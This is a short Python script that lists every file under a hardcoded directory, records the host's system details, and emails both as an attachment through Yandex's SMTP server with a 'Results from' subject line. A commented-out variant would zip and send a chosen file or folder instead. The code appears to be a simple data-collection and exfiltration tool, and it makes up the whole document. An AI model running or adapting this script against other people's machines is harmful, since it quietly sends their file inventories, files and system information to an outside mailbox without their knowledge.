import os, sys
# from zipfile import ZipFile
from smtplib import SMTP_SSL
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

filename = "info.txt"
directory = "/home/user/Templates/Python/TEST/"
with open(filename, 'w', errors = "ignore") as fileWrite:
	for root, dirs, files in os.walk(directory):
		for file in files:
			fileWrite.write(os.path.join(root,file+'\n'))
'''
filename = "archive.zip"
pathTo = "/home/user/file.txt"
if os.path.isdir(pathTo):
	with ZipFile(filename, 'w') as fileWrite:
		for root, dirs, files in os.walk(pathTo):
			for file in files:
				fileWrite.write(os.path.join(root,file))
else:
	with ZipFile(filename, 'w') as fileWrite:
		fileWrite.write(pathTo)
'''

address = "" # example@yandex.ru
password = "" # password

msg = MIMEMultipart()
msg["Subject"] = "Results from "+ str(os.uname()[1])
msg["From"] = address
msg["To"] = address

text = MIMEText(\
"Sysname = " +str(os.uname()[0])+'\n' +\
"Hostname = "+str(os.uname()[1])+'\n' +\
"Release = " +str(os.uname()[2])+'\n' +\
"Version = " +str(os.uname()[3])+'\n' +\
"Machine = " +str(os.uname()[4])+'\n'  )

part = MIMEBase("application", "octet-stream")
part.set_payload(open(filename,'rb').read())
encoders.encode_base64(part)
part.add_header("Content-Disposition", "attachment; filename=%s" % os.path.basename(filename))

msg.attach(text)
msg.attach(part)

smtp = SMTP_SSL()
smtp.connect("smtp.yandex.ru")
smtp.login(address, password)
smtp.sendmail(address, address, msg.as_string())
smtp.quit()